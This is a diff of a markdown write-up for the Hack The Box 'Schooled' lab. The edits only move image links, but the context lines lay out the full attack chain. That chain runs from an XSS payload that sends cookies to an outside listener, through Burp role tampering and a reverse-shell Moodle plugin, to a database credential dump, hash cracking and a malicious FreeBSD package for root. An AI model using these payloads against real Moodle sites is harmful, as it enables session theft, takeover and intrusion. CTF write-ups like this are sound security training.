@@ -31,9 +31,11 @@ Scanning for all ports using nmap shows **mysql** is running on port **33060**. 
 
 Moving on, we begin by looking at port 80 as always.
 - Looking at page source suggests for adding an entry in our hosts list. Add `schooled.htb     <corresponding IP>` to your `/etc/hosts` file and continue browsing the site. 
-    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled3.png)
+
+![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled3.png)
 - Looking at the about us page . We discover The possble CMS used is - **Moodle**
-    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled4.png)
+
+![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled4.png)
 - Looking at the Teachers page , we find a bunch of possible unames and roles. Add them to a `user.list` file.
     ```bash
     Jane Higgins :- Scientific Research lecturer
@@ -50,7 +52,8 @@ Moving on, we begin by looking at port 80 as always.
 - Nothing seems too useful so far. No admin/login panels were found so far.
 - Using `gobuster` for `vhost` bruteforcing we find: `moodle.schooled.htb`
 - Add `moodle.schooled.htb` to your `/etc/hosts` list and browse to it as before.
-    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled5.png)
+
+![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled5.png)
 - Visiting the page lets us signup without a confirmation.
 - Abuse this to create an account next. While signing up the mail naming convention is name@student.schooled.htb.
 - After unsuccesfull attempts to upload a payload and get rce, what is odd is that `Manuel Phillips` (teacher) was online and the owner of the maths course. A Possible XSS attack could be attempted.
@@ -67,9 +70,11 @@ Moving on, we begin by looking at port 80 as always.
 - Enroll in the maths course .
 - Use this xss payload: `<img src=x onerror=this.src='http://10.10.14.51:8888/?'+document.cookie;>`
 - Paste it in the user settings section
-    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled6.png)
+
+![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled6.png)
 - Wait for a few seconds and recieve the teachers cookie on your `xss-server`.
-    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled7.png)
+
+![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled7.png)
 - Copy this `cookie --> Inspect Element --> Storage --> replace MoodleSession's value to the cookie`. Refresh the pg/F5 to. You're Now Manuel Phillips (Teacher).
 
 ### PRIVILEGE ESCALATION: TEACHER --> MANAGER --> ADMIN
@@ -83,14 +88,17 @@ Moving on, we begin by looking at port 80 as always.
     - Click on the Enroll Users option and enroll Lianne carter. Switch on intercept in burp and intercept the passed request.
     - Send the request to repeater and change the following 2 values to match that of your current teacher(`id=24`).
     - Changed these params to match: `userlist%5B%5D=24&roletoassign=1`. (Changing user id to teachers id == 24 and changing role to admin == 1)
-    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled8.png)
+    
+    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled8.png)
 - Send the request and stop intercept after.
     - From here click on Lianne carter's profile from the below list. Note to see the difference and an Administration button appear on the side.
-    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled9.png)
+    
+    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled9.png)
 - Click on it and now we have manager privileges.
 - From the POC discussed above we can add even more privileges to allow us to install a plugin of choice. To do this click on site administration from here.
 - Click on `Users --> define roles`.  Click on the 'edit' icon in the manager role. Turn intercept on before you do and add the payload from the POC described. Forward the request to get admin privileges.
-    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled10.png)
+    
+![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled10.png)
 - Next grab `rce.zip` from [here](https://github.com/HoangKien1020/Moodle_RCE)
 - Unzip the file. Modify `block_rce.php` file to a standard php reverse shell of your choosing. Zip back the contents using `zip -r -q lala.zip rce`
 - Click on install plugin after `upload --> continue`. You will see a screen with current information. Dont go past it . Time to trigger the rce.
@@ -107,7 +115,8 @@ Moving on, we begin by looking at port 80 as always.
 
 - Poking around and looking for config files, we find the apache and moodle data directory as `usr/local/www/apache24/data/moodle/`.
 - Checking the contents of the **config.php** file in dir:
-    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled11.jpg)
+    
+![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled11.jpg)
 - We get database creds as *moodle:P################0* .
 - Notice that mysql dosent exist in PATH. We find mysql using the basic find command: `find / -name mysql 2> /dev/null`
 - Mysql is at `/usr/local/bin/mysql`.
@@ -117,11 +126,13 @@ Moving on, we begin by looking at port 80 as always.
     - `mysql -u moodle -pPlaybookMaster2020 -e 'show databases;'` --> infer moodle as the db name.
     - `mysql -u moodle -pPlaybookMaster2020 -e 'use moodle; show tables;'`  --> infer mdl_user could be of interest.
     - `mysql -u moodle -pPlaybookMaster2020 -e 'use moodle; select * from mdl_user;'` --> DB creds dump. 
-    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled12.png)
+    
+    ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled12.png)
 - Jamie's account here is of interest as he is one of the users on the box.
 - This hash is a `bcrypt hash`.
 - Use john the ripper to crack the hash:
-    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled13.jpg)
+
+![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled13.jpg)
 - Jamies creds: *jamie:!#####x*
 - Now ssh over with these creds.
 - Grab `user.txt` from jamie's home directory.
@@ -129,7 +140,8 @@ Moving on, we begin by looking at port 80 as always.
 **root.txt**
 
 - Performing a basic `sudo -l`:
-    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled14.png)
+
+![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled14.png)
 - Poking around the internet and doing some good research on what the command is we find that it is a distinct binary that is replaced by the bootstrapped binary during the initial installation process.
 - We can use this to probably install a custom package with code modified to privilege escalate to root.
 - [Refer this article](http://lastsummer.de/creating-custom-packages-on-freebsd/)
@@ -172,8 +184,10 @@ Moving on, we begin by looking at port 80 as always.
 - Save the script and make it an executable: `chmod +x script.sh`
 - Execute the script and note to see a package made named: `mypackage-1.0_5.txz`
 - Run : `sudo /usr/sbin/pkg install --no-repo-update mypackage-1.0_5.txz` (`--no-repo-update` to stop it from checking an online source) and start a listener.
-    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled15.png)
-    - ![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled16.png)
+
+![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled15.png)
+
+![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/ctf/HackTheBox_Schooled_Writeup/images/schooled16.png)
 - Grab `root.txt` from the root home directory.
 
 --------------------------------------------------------------
